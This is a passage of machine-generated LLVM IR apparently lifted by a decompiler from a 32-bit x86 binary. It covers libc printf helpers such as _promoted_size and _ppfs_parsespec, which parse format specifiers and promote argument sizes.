  %v1_8052e0c = add i32 %v3_8052de0, 8
  store i32 %v1_8052e0c, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e0c, i32* %v2_8052de0, align 4
  %v0_8052e12 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e12 = inttoptr i32 %v0_8052e12 to i32*
  %v2_8052e12 = load i32, i32* %v1_8052e12, align 4
  store i32 %v2_8052e12, i32* %eax.global-to-local, align 4
  %v1_8052e14 = add i32 %v0_8052e12, 4
  %v2_8052e14 = inttoptr i32 %v1_8052e14 to i32*
  %v3_8052e14 = load i32, i32* %v2_8052e14, align 4
  store i32 %v3_8052e14, i32* %edx.global-to-local, align 4
  %v1_8052e17 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e17 = inttoptr i32 %v1_8052e17 to i32*
  store i32 %v2_8052e12, i32* %v2_8052e17, align 4
  %v0_8052e19 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e19 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e19 = add i32 %v1_8052e19, 4
  %v3_8052e19 = inttoptr i32 %v2_8052e19 to i32*
  store i32 %v0_8052e19, i32* %v3_8052e19, align 4
  br label %dec_label_pc_8052e46

dec_label_pc_8052e1e:                             ; preds = %dec_label_pc_8052de5
  %v3_8052e1e = load i32, i32* %v2_8052de0, align 4
  store i32 %v3_8052e1e, i32* %edx.global-to-local, align 4
  %v1_8052e21 = add i32 %v3_8052e1e, 8
  store i32 %v1_8052e21, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e21, i32* %v2_8052de0, align 4
  %v0_8052e27 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e27 = inttoptr i32 %v0_8052e27 to double*
  %v2_8052e27 = load double, double* %v1_8052e27, align 4
  %v2_8052e29 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8052e29 = inttoptr i32 %v2_8052e29 to double*
  store double %v2_8052e27, double* %v4_8052e29, align 4
  br label %dec_label_pc_8052e46

dec_label_pc_8052e2d:                             ; preds = %dec_label_pc_8052e03
  %v3_8052e2d = load i32, i32* %v2_8052de0, align 4
  store i32 %v3_8052e2d, i32* %edx.global-to-local, align 4
  %v1_8052e30 = add i32 %v3_8052e2d, 12
  store i32 %v1_8052e30, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e30, i32* %v2_8052de0, align 4
  %v0_8052e36 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e36 = inttoptr i32 %v0_8052e36 to x86_fp80*
  %v2_8052e36 = load x86_fp80, x86_fp80* %v1_8052e36, align 4
  %v2_8052e38 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052e38 = inttoptr i32 %v2_8052e38 to x86_fp80*
  store x86_fp80 %v2_8052e36, x86_fp80* %v3_8052e38, align 4
  br label %dec_label_pc_8052e46

dec_label_pc_8052e3c:                             ; preds = %dec_label_pc_8052de5, %dec_label_pc_8052df3, %dec_label_pc_8052e03
  %v1_8052e3c = add i32 %v3_8052de0, 4
  store i32 %v1_8052e3c, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e3c, i32* %v2_8052de0, align 4
  %v0_8052e42 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e42 = inttoptr i32 %v0_8052e42 to i32*
  %v2_8052e42 = load i32, i32* %v1_8052e42, align 4
  store i32 %v2_8052e42, i32* %eax.global-to-local, align 4
  %v1_8052e44 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e44 = inttoptr i32 %v1_8052e44 to i32*
  store i32 %v2_8052e42, i32* %v2_8052e44, align 4
  br label %dec_label_pc_8052e46

dec_label_pc_8052e46:                             ; preds = %dec_label_pc_8052e2d, %dec_label_pc_8052e1e, %dec_label_pc_8052e0c, %dec_label_pc_8052e3c
  %v0_8052e46 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e46 = add i32 %v0_8052e46, 12
  store i32 %v1_8052e46, i32* %ebx.global-to-local, align 4
  %v0_8052e49.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e4a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052e49

dec_label_pc_8052e49:                             ; preds = %dec_label_pc_8052dd7, %dec_label_pc_8052e46
  %v1_8052e4a = phi i32 [ %v1_8052e4a22, %dec_label_pc_8052dd7 ], [ %v1_8052e4a.pre, %dec_label_pc_8052e46 ]
  %v0_8052e49 = phi i32 [ %v1_8052dd721, %dec_label_pc_8052dd7 ], [ %v0_8052e49.pre, %dec_label_pc_8052e46 ]
  %v1_8052e49 = add i32 %v0_8052e49, 1
  store i32 %v1_8052e49, i32* %esi.global-to-local, align 4
  %v2_8052e4a = add i32 %v1_8052e4a, 28
  %v3_8052e4a = inttoptr i32 %v2_8052e4a to i32*
  %v4_8052e4a = load i32, i32* %v3_8052e4a, align 4
  %v5_8052e4d = icmp slt i32 %v1_8052e49, %v4_8052e4a
  br i1 %v5_8052e4d, label %dec_label_pc_8052dd7, label %dec_label_pc_8052e4a.dec_label_pc_8052e7f.loopexit_crit_edge

dec_label_pc_8052e51:                             ; preds = %entry
  br i1 %v1_8052e58, label %dec_label_pc_8052e68, label %dec_label_pc_8052e5a

dec_label_pc_8052e5a:                             ; preds = %dec_label_pc_8052e51
  %v1_8052e5a = add i32 %arg1, 36
  %v2_8052e5a = inttoptr i32 %v1_8052e5a to i8*
  %v3_8052e5a = load i8, i8* %v2_8052e5a, align 1
  %v2_8052e5e = zext i8 %v3_8052e5a to i32
  %v3_8052e5e = mul nuw nsw i32 %v2_8052e5e, 12
  store i32 %v3_8052e5e, i32* %eax.global-to-local, align 4
  %v2_8052e61 = add i32 %arg1, 68
  %v3_8052e61 = add i32 %v2_8052e61, %v3_8052e5e
  %v4_8052e61 = inttoptr i32 %v3_8052e61 to i32*
  %v5_8052e61 = load i32, i32* %v4_8052e61, align 4
  store i32 %v5_8052e61, i32* %eax.global-to-local, align 4
  store i32 %v5_8052e61, i32* %v2_8052e51, align 4
  %v0_8052e68.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052e68

dec_label_pc_8052e68:                             ; preds = %dec_label_pc_8052e51, %dec_label_pc_8052e5a
  %v1_8052e7c = phi i32 [ %arg1, %dec_label_pc_8052e51 ], [ %v0_8052e68.pre, %dec_label_pc_8052e5a ]
  %v1_8052e68 = add i32 %v1_8052e7c, 4
  %v2_8052e68 = inttoptr i32 %v1_8052e68 to i32*
  %v3_8052e68 = load i32, i32* %v2_8052e68, align 4
  %v8_8052e68 = icmp eq i32 %v3_8052e68, -2147483648
  %v1_8052e6f = icmp eq i1 %v8_8052e68, false
  br i1 %v1_8052e6f, label %dec_label_pc_8052e7f, label %dec_label_pc_8052e71

dec_label_pc_8052e71:                             ; preds = %dec_label_pc_8052e68
  %v1_8052e71 = add i32 %v1_8052e7c, 37
  %v2_8052e71 = inttoptr i32 %v1_8052e71 to i8*
  %v3_8052e71 = load i8, i8* %v2_8052e71, align 1
  %v2_8052e75 = zext i8 %v3_8052e71 to i32
  %v3_8052e75 = mul nuw nsw i32 %v2_8052e75, 12
  store i32 %v3_8052e75, i32* %eax.global-to-local, align 4
  %v1_8052e78 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e78 = add nsw i32 %v3_8052e75, -12
  %v3_8052e78 = add i32 %v2_8052e78, %v1_8052e78
  %v4_8052e78 = inttoptr i32 %v3_8052e78 to i32*
  %v5_8052e78 = load i32, i32* %v4_8052e78, align 4
  store i32 %v5_8052e78, i32* %eax.global-to-local, align 4
  store i32 %v5_8052e78, i32* %v2_8052e68, align 4
  %v0_8052e7f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052e7f

dec_label_pc_8052e4a.dec_label_pc_8052e7f.loopexit_crit_edge: ; preds = %dec_label_pc_8052e49
  br label %dec_label_pc_8052e7f.loopexit

dec_label_pc_8052e7f.loopexit:                    ; preds = %dec_label_pc_8052e4a.dec_label_pc_8052e7f.loopexit_crit_edge, %dec_label_pc_8052dd3
  %v1_8052e4a.lcssa = phi i32 [ %v1_8052e4a, %dec_label_pc_8052e4a.dec_label_pc_8052e7f.loopexit_crit_edge ], [ %v1_8052e4a15, %dec_label_pc_8052dd3 ]
  br label %dec_label_pc_8052e7f

dec_label_pc_8052e7f:                             ; preds = %dec_label_pc_8052e7f.loopexit, %dec_label_pc_8052e68, %dec_label_pc_8052e71
  %v10_8052e86 = phi i32 [ %v1_8052e4a.lcssa, %dec_label_pc_8052e7f.loopexit ], [ %v1_8052e7c, %dec_label_pc_8052e68 ], [ %v0_8052e7f.pre, %dec_label_pc_8052e71 ]
  %v1_8052e7f = add i32 %v10_8052e86, 8
  %v2_8052e7f = inttoptr i32 %v1_8052e7f to i32*
  %v3_8052e7f = load i32, i32* %v2_8052e7f, align 4
  store i32 %v3_8052e7f, i32* %eax.global-to-local, align 4
  %v2_8052e82 = icmp slt i32 %v3_8052e7f, 0
  %v1_8052e84 = icmp eq i1 %v2_8052e82, false
  br i1 %v1_8052e84, label %dec_label_pc_8052e9a, label %dec_label_pc_8052e86

dec_label_pc_8052e86:                             ; preds = %dec_label_pc_8052e7f
  %v1_8052e86 = add i32 %v10_8052e86, 16
  %v2_8052e86 = inttoptr i32 %v1_8052e86 to i32*
  %v3_8052e86 = load i32, i32* %v2_8052e86, align 4
  %v4_8052e86 = or i32 %v3_8052e86, 8
  store i32 %v4_8052e86, i32* %v2_8052e86, align 4
  %v0_8052e8a = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e8a = sub i32 0, %v0_8052e8a
  store i32 %v1_8052e8a, i32* %eax.global-to-local, align 4
  %v1_8052e8c = load i32, i32* @ecx, align 4
  %v2_8052e8c = add i32 %v1_8052e8c, 8
  %v3_8052e8c = inttoptr i32 %v2_8052e8c to i32*
  store i32 %v1_8052e8a, i32* %v3_8052e8c, align 4
  %v0_8052e8f = load i32, i32* @ecx, align 4
  %v1_8052e8f = add i32 %v0_8052e8f, 16
  %v2_8052e8f = inttoptr i32 %v1_8052e8f to i32*
  %v3_8052e8f = load i32, i32* %v2_8052e8f, align 4
  %v4_8052e8f = and i32 %v3_8052e8f, -2
  store i32 %v4_8052e8f, i32* %v2_8052e8f, align 4
  %v0_8052e93 = load i32, i32* @ecx, align 4
  %v1_8052e93 = add i32 %v0_8052e93, 20
  %v2_8052e93 = inttoptr i32 %v1_8052e93 to i32*
  store i32 32, i32* %v2_8052e93, align 4
  %v0_8052e9c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e9a

dec_label_pc_8052e9a:                             ; preds = %dec_label_pc_8052e7f, %dec_label_pc_8052e86
  %v0_8052e9c = phi i32 [ %v3_8052e7f, %dec_label_pc_8052e7f ], [ %v0_8052e9c.pre, %dec_label_pc_8052e86 ]
  %v2_8052e9a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052e9a, i32* @ebx, align 4
  ret i32 %v0_8052e9c

; uselistorder directives
  uselistorder i32 %v3_8052e75, { 1, 0 }
  uselistorder i32 %v3_8052e5e, { 1, 0 }
  uselistorder i32 %v1_8052e49, { 2, 1, 0 }
  uselistorder i32 %v1_8052e4a, { 1, 2, 0 }
  uselistorder i32 %v3_8052de0, { 1, 0, 2 }
  uselistorder i32* %v2_8052de0, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8052ddb, { 1, 0 }
  uselistorder i32 %v6_8052dd7, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_8052dd721, { 1, 0 }
  uselistorder i32 %v1_8052e4a15, { 2, 0, 1 }
  uselistorder i1 %v1_8052e58, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_8052e9a, { 1, 0 }
  uselistorder label %dec_label_pc_8052e7f, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052e68, { 1, 0 }
  uselistorder label %dec_label_pc_8052e49, { 1, 0 }
  uselistorder label %dec_label_pc_8052e46, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052e3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052dd7, { 1, 0 }
  uselistorder label %dec_label_pc_8052dd3, { 1, 0 }
  uselistorder label %dec_label_pc_8052db9, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052ea0 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8052ea7

dec_label_pc_8052ea7:                             ; preds = %dec_label_pc_8052ea7, %entry
  %v0_8052ea7 = phi i32 [ ptrtoint (i8** @global_var_805dbaa.928 to i32), %entry ], [ %v1_8052ea7, %dec_label_pc_8052ea7 ]
  %v1_8052ea7 = add i32 %v0_8052ea7, -2
  %v1_8052eaa = inttoptr i32 %v1_8052ea7 to i16*
  %v2_8052eaa = load i16, i16* %v1_8052eaa, align 2
  %v3_8052eaa = sext i16 %v2_8052eaa to i32
  %v12_8052ead = icmp ne i32 %v3_8052eaa, %v0_8052ea0
  %v6_8052eb7 = icmp ugt i32 %v1_8052ea7, ptrtoint (i32* @global_var_805db92.929 to i32)
  %or.cond = and i1 %v6_8052eb7, %v12_8052ead
  br i1 %or.cond, label %dec_label_pc_8052ea7, label %dec_label_pc_8052eb9

dec_label_pc_8052eb9:                             ; preds = %dec_label_pc_8052ea7
  %.pre = add i32 %v0_8052ea7, -134601620
  %v2_8052ebf = sdiv i32 %.pre, 2
  store i32 %v2_8052ebf, i32* @edx, align 4
  %v1_8052ec1 = add i32 %v2_8052ebf, ptrtoint (i8** @global_var_805dbaa.928 to i32)
  %v2_8052ec1 = inttoptr i32 %v1_8052ec1 to i8*
  %v3_8052ec1 = load i8, i8* %v2_8052ec1, align 1
  %v4_8052ec1 = zext i8 %v3_8052ec1 to i32
  ret i32 %v4_8052ec1

; uselistorder directives
  uselistorder i32 %v2_8052ebf, { 1, 0 }
  uselistorder i32 %v1_8052ea7, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805dbaa.928 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052eca = load i32, i32* @edi, align 4
  %v0_8052ecb = load i32, i32* @esi, align 4
  %v0_8052ecc = load i32, i32* @ebx, align 4
  store i32 %v0_8052ecc, i32* %stack_var_-16, align 4
  %v4_8052ecc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8052ef8 = add i32 %tmp76, 24
  %v2_8052ef8 = inttoptr i32 %v1_8052ef8 to i32*
  %v3_8052ef8 = load i32, i32* %v2_8052ef8, align 4
  store i32 %v3_8052ef8, i32* %eax.global-to-local, align 4
  %v1_8052eff = add i32 %tmp76, 16
  %v2_8052eff = inttoptr i32 %v1_8052eff to i32*
  %v3_8052eff = load i32, i32* %v2_8052eff, align 4
  %v1_8052f02 = and i32 %v3_8052eff, 128
  %v2_8052f02 = icmp eq i32 %v1_8052f02, 0
  store i32 %v1_8052f02, i32* %edi.global-to-local, align 4
  %v1_8052f08 = icmp eq i1 %v2_8052f02, false
  br i1 %v1_8052f08, label %dec_label_pc_8052f1b, label %dec_label_pc_8052f0a

dec_label_pc_8052f0a:                             ; preds = %entry
  %v2_8052f0a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8052f68.outer

dec_label_pc_8052f15:                             ; preds = %dec_label_pc_80530a3
  %v1_8052f15 = add i32 %v0_80530a3.pre.pre, 1
  store i32 %v1_8052f15, i32* @esi, align 4
  br label %dec_label_pc_80530b3

dec_label_pc_8052f1b:                             ; preds = %entry
  %v15_8052ecd = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052f1d

dec_label_pc_8052f1d:                             ; preds = %dec_label_pc_8052f45.dec_label_pc_8052f1d_crit_edge, %dec_label_pc_8052f1b
  %v2_8052f2e = phi i32 [ %v2_8052f2e.pre, %dec_label_pc_8052f45.dec_label_pc_8052f1d_crit_edge ], [ %v15_8052ecd, %dec_label_pc_8052f1b ]
  %v3_8052f2e = phi i32 [ %v1_8052f45, %dec_label_pc_8052f45.dec_label_pc_8052f1d_crit_edge ], [ 0, %dec_label_pc_8052f1b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8052f21 = mul i32 %v3_8052f2e, 4
  store i32 %v1_8052f21, i32* @ecx, align 4
  %v2_8052f28 = load i32, i32* %arg1, align 4
  store i32 %v2_8052f28, i32* @edx, align 4
  %v2_8052f2a = add i32 %v1_8052f21, -4
  %v3_8052f2a = add i32 %v2_8052f2a, %v2_8052f28
  %v4_8052f2a = inttoptr i32 %v3_8052f2a to i32*
  %v5_8052f2a = load i32, i32* %v4_8052f2a, align 4
  store i32 %v5_8052f2a, i32* %eax.global-to-local, align 4
  %v1_8052f2e = trunc i32 %v5_8052f2a to i8
  %v4_8052f2e = add i32 %v2_8052f2e, 36
  %v5_8052f2e = add i32 %v4_8052f2e, %v3_8052f2e
  %v6_8052f2e = inttoptr i32 %v5_8052f2e to i8*
  store i8 %v1_8052f2e, i8* %v6_8052f2e, align 1
  %v0_8052f32 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f32 = urem i32 %v0_8052f32, 256
  %v2_8052f32 = load i32, i32* @ebx, align 4
  %v3_8052f32 = and i32 %v2_8052f32, -256
  %v4_8052f32 = or i32 %v3_8052f32, %v1_8052f32
  store i32 %v4_8052f32, i32* @ebx, align 4
  %v1_8052f34 = mul i32 %v0_8052f32, 16777216
  %v2_8052f34 = sdiv i32 %v1_8052f34, 16777216
  store i32 %v2_8052f34, i32* %eax.global-to-local, align 4
  %v1_8052f37 = load i32, i32* @edx, align 4
  %v2_8052f37 = load i32, i32* @ecx, align 4
  %v3_8052f37 = add i32 %v1_8052f37, -4
  %v4_8052f37 = add i32 %v3_8052f37, %v2_8052f37
  %v5_8052f37 = inttoptr i32 %v4_8052f37 to i32*
  %v6_8052f37 = load i32, i32* %v5_8052f37, align 4
  %v17_8052f37 = icmp eq i32 %v2_8052f34, %v6_8052f37
  %v1_8052f3b = icmp eq i1 %v17_8052f37, false
  br i1 %v1_8052f3b, label %dec_label_pc_805328d, label %dec_label_pc_8052f41

dec_label_pc_8052f41:                             ; preds = %dec_label_pc_8052f1d
  %v3_8052f41 = trunc i32 %v0_8052f32 to i8
  %v4_8052f41 = icmp eq i8 %v3_8052f41, 0
  br i1 %v4_8052f41, label %dec_label_pc_8052f4b, label %dec_label_pc_8052f45

dec_label_pc_8052f45:                             ; preds = %dec_label_pc_8052f41
  %v0_8052f45 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052f45 = add i32 %v0_8052f45, 1
  store i32 %v1_8052f45, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052f45, 32
  br i1 %tmp, label %dec_label_pc_8052f45.dec_label_pc_8052f1d_crit_edge, label %dec_label_pc_8052f4b

dec_label_pc_8052f45.dec_label_pc_8052f1d_crit_edge: ; preds = %dec_label_pc_8052f45
  %v2_8052f2e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052f1d

dec_label_pc_8052f4b:                             ; preds = %dec_label_pc_8052f45, %dec_label_pc_8052f41
  %v2_8052f50 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8052f68.outer

dec_label_pc_8052f68.outer:                       ; preds = %dec_label_pc_8052f4b, %dec_label_pc_8052f0a, %dec_label_pc_8053085
  %v0_8052f74.ph94 = phi i32 [ %v1_8053085, %dec_label_pc_8053085 ], [ %v2_8052f0a, %dec_label_pc_8052f0a ], [ %v2_8052f50, %dec_label_pc_8052f4b ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8053085 ], [ %tmp66, %dec_label_pc_8052f0a ], [ %tmp66, %dec_label_pc_8052f4b ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8052f0e, %dec_label_pc_8053085 ], [ 0, %dec_label_pc_8052f0a ], [ 0, %dec_label_pc_8052f4b ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8053085 ], [ %v3_8052ef8, %dec_label_pc_8052f0a ], [ %v3_8052ef8, %dec_label_pc_8052f4b ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8053085 ], [ 0, %dec_label_pc_8052f0a ], [ 0, %dec_label_pc_8052f4b ]
  %v7_8052f6f = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8052f6f = trunc i64 %v7_8052f6f to i32
  %v2_8052f77 = add i32 %v8_8052f6f, 80
  br label %dec_label_pc_8052f68

dec_label_pc_8052f68:                             ; preds = %dec_label_pc_8052f68.outer, %dec_label_pc_8053025
  %v0_8052f74 = phi i32 [ %v0_8053032, %dec_label_pc_8053025 ], [ %v0_8052f74.ph94, %dec_label_pc_8052f68.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8053025 ], [ %stack_var_-32.1.ph, %dec_label_pc_8052f68.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8053025 ], [ %stack_var_-88.1.ph, %dec_label_pc_8052f68.outer ]
  store i32 %v0_8052f74, i32* @edx, align 4
  %v1_8052f68 = inttoptr i32 %v0_8052f74 to i8*
  %v2_8052f68 = load i8, i8* %v1_8052f68, align 1
  %v11_8052f68 = icmp eq i8 %v2_8052f68, 42
  store i32 %v0_8052f74, i32* @esi, align 4
  %v1_8052f6d = icmp eq i1 %v11_8052f68, false
  br i1 %v1_8052f6d, label %dec_label_pc_8052f7f, label %dec_label_pc_8052f6f

dec_label_pc_8052f6f:                             ; preds = %dec_label_pc_8052f68
  store i32 %v8_8052f6f, i32* %eax.global-to-local, align 4
  %v1_8052f74 = add i32 %v0_8052f74, 1
  store i32 %v1_8052f74, i32* @esi, align 4
  %v0_8052f77 = load i32, i32* @esp, align 4
  %v3_8052f77 = add i32 %v2_8052f77, %v0_8052f77
  %v4_8052f77 = inttoptr i32 %v3_8052f77 to i32*
  store i32 0, i32* %v4_8052f77, align 4
  %v0_8052f99.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052f7f

dec_label_pc_8052f7f:                             ; preds = %dec_label_pc_8052f68, %dec_label_pc_8052f6f
  %v0_8052f99.pre = phi i32 [ %v0_8052f74, %dec_label_pc_8052f68 ], [ %v0_8052f99.pre.pre, %dec_label_pc_8052f6f ]
  %v0_8052f7f = load i32, i32* @global_var_805f23c, align 4
  store i32 %v0_8052f7f, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8052f99.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f99

dec_label_pc_8052f89:                             ; preds = %dec_label_pc_8052f99
  %v1_8052f89 = add i32 %v1_8052f91, -4094
  %v6_8052f89 = sub i32 4093, %v1_8052f91
  %v7_8052f89 = and i32 %v6_8052f89, %v1_8052f91
  %v8_8052f89 = icmp slt i32 %v7_8052f89, 0
  %v9_8052f89 = icmp eq i32 %v1_8052f89, 0
  %v10_8052f89 = icmp slt i32 %v1_8052f89, 0
  %v3_8052f8f = icmp eq i1 %v10_8052f89, %v8_8052f89
  %v4_8052f8f = icmp eq i1 %v9_8052f89, false
  %v5_8052f8f = and i1 %v4_8052f8f, %v3_8052f8f
  br i1 %v5_8052f8f, label %dec_label_pc_8052f98, label %dec_label_pc_8052f91

dec_label_pc_8052f91:                             ; preds = %dec_label_pc_8052f89
  %v3_8052f91 = mul i32 %v1_8052f91, 10
  store i32 %v3_8052f91, i32* %eax.global-to-local, align 4
  %v2_8052f94 = add i32 %v3_8052f91, -48
  %v3_8052f94 = add i32 %v2_8052f94, %v2_8052f9b
  store i32 %v3_8052f94, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052f98

dec_label_pc_8052f98:                             ; preds = %dec_label_pc_8052f89, %dec_label_pc_8052f91
  %v0_8052fb332 = phi i32 [ %v1_8052f91, %dec_label_pc_8052f89 ], [ %v3_8052f94, %dec_label_pc_8052f91 ]
  %v4_8052f9928 = phi i32 [ %v6_8052f99, %dec_label_pc_8052f89 ], [ %v3_8052f91, %dec_label_pc_8052f91 ]
  %v1_8052f98 = add i32 %v0_8052f98, 1
  store i32 %v1_8052f98, i32* @esi, align 4
  br label %dec_label_pc_8052f99

dec_label_pc_8052f99:                             ; preds = %dec_label_pc_8052f7f, %dec_label_pc_8052f98
  %v1_8052f91 = phi i32 [ 0, %dec_label_pc_8052f7f ], [ %v0_8052fb332, %dec_label_pc_8052f98 ]
  %v4_8052f99 = phi i32 [ %v4_8052f99.pre, %dec_label_pc_8052f7f ], [ %v4_8052f9928, %dec_label_pc_8052f98 ]
  %v0_8052f98 = phi i32 [ %v0_8052f99.pre, %dec_label_pc_8052f7f ], [ %v1_8052f98, %dec_label_pc_8052f98 ]
  %v1_8052f99 = inttoptr i32 %v0_8052f98 to i8*
  %v2_8052f99 = load i8, i8* %v1_8052f99, align 1
  %v3_8052f99 = zext i8 %v2_8052f99 to i32
  %v5_8052f99 = and i32 %v4_8052f99, -256
  %v6_8052f99 = or i32 %v3_8052f99, %v5_8052f99
  store i32 %v6_8052f99, i32* %eax.global-to-local, align 4
  %v2_8052f9b = sext i8 %v2_8052f99 to i32
  store i32 %v2_8052f9b, i32* @ecx, align 4
  %v2_8052f9e = mul nsw i32 %v2_8052f9b, 2
  %v3_8052f9e = add i32 %v2_8052f9e, %v0_8052f7f
  %v4_8052f9e = inttoptr i32 %v3_8052f9e to i8*
  %v5_8052f9e = load i8, i8* %v4_8052f9e, align 1
  %v6_8052f9e = and i8 %v5_8052f9e, 8
  %v7_8052f9e = icmp eq i8 %v6_8052f9e, 0
  %v1_8052fa3 = icmp eq i1 %v7_8052f9e, false
  br i1 %v1_8052fa3, label %dec_label_pc_8052f89, label %dec_label_pc_8052fa5

dec_label_pc_8052fa5:                             ; preds = %dec_label_pc_8052f99
  %v0_8052fa5 = load i32, i32* @edx, align 4
  %v1_8052fa5 = add i32 %v0_8052fa5, -1
  %v2_8052fa5 = inttoptr i32 %v1_8052fa5 to i8*
  %v3_8052fa5 = load i8, i8* %v2_8052fa5, align 1
  %v12_8052fa5 = icmp eq i8 %v3_8052fa5, 37
  %v1_8052fa9 = icmp eq i1 %v12_8052fa5, false
  br i1 %v1_8052fa9, label %dec_label_pc_805303c, label %dec_label_pc_8052faf

dec_label_pc_8052faf:                             ; preds = %dec_label_pc_8052fa5
  %v10_8052faf = icmp eq i8 %v2_8052f99, 36
  %v1_8052fb1 = icmp eq i1 %v10_8052faf, false
  br i1 %v1_8052fb1, label %dec_label_pc_8052fe3, label %dec_label_pc_8052fb3

dec_label_pc_8052fb3:                             ; preds = %dec_label_pc_8052faf
  %tmp89 = icmp slt i32 %v1_8052f91, 1
  br i1 %tmp89, label %dec_label_pc_8052fe3, label %dec_label_pc_8052fb7

dec_label_pc_8052fb7:                             ; preds = %dec_label_pc_8052fb3
  %v4_8052fb7 = icmp eq i32 %stack_var_-88.1, 0
  %v1_8052fbc = add i32 %v0_8052f98, 1
  store i32 %v1_8052fbc, i32* @edx, align 4
  br i1 %v4_8052fb7, label %dec_label_pc_805328d, label %dec_label_pc_8052fc5

dec_label_pc_8052fc5:                             ; preds = %dec_label_pc_8052fb7
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8052fcd = sub i32 %v1_8052f91, %stack_var_-88.1
  %v8_8052fcd = xor i32 %v1_8052f91, %stack_var_-88.1
  %v9_8052fcd = xor i32 %v2_8052fcd, %v1_8052f91
  %v10_8052fcd = and i32 %v9_8052fcd, %v8_8052fcd
  %v11_8052fcd = icmp slt i32 %v10_8052fcd, 0
  %v12_8052fcd = icmp eq i32 %v2_8052fcd, 0
  %v13_8052fcd = icmp slt i32 %v2_8052fcd, 0
  %v3_8052fcf = icmp ne i1 %v13_8052fcd, %v11_8052fcd
  %v4_8052fcf = or i1 %v12_8052fcd, %v3_8052fcf
  %stack_var_-88.1.v0_8052fd1 = select i1 %v4_8052fcf, i32 %stack_var_-88.1, i32 %v1_8052f91
  br label %dec_label_pc_8052fdf

dec_label_pc_8052fdf:                             ; preds = %dec_label_pc_8052ff3, %dec_label_pc_8052fc5, %dec_label_pc_8052ff7
  %v0_8052fdf = phi i32 [ %v1_8052fbc, %dec_label_pc_8052fc5 ], [ %v0_8052fa5, %dec_label_pc_8052ff7 ], [ %v0_8052fa5, %dec_label_pc_8052ff3 ]
  %stack_var_-32.2 = phi i32 [ %v1_8052f91, %dec_label_pc_8052fc5 ], [ %stack_var_-32.1, %dec_label_pc_8052ff7 ], [ %stack_var_-32.1, %dec_label_pc_8052ff3 ]
